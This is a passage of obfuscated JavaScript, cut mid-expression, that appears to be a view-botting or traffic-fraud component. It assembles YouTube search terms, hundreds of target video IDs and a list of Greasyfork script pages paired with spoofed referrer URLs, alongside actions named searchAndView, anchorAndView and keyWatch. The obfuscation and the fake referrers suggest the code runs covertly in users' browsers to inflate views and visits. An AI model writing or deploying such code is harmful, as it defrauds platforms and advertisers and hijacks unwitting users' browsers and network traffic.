'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + a5(0x1) + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + a6(0x24, 'Rp^B') + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + a6(0xc, 'UJ*i') + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + a5(0xe)]['repeatExte' + 'nd'](-0x1e26 + 0x2 * 0x773 + 0xf4a)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1 * -0x263f + -0x1cf * -0x2 + -0x29d3)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * 0x1369 + -0x1 * -0x11e + -0x1484);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    a7(0x18) + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    a6(0x2, 'aJZu') + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    a6(0x23, 'tyM*') + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + a7(0x6) + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a7(0x16) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': a7(0x5) + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + a6(0x1a, '1Cdq') + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
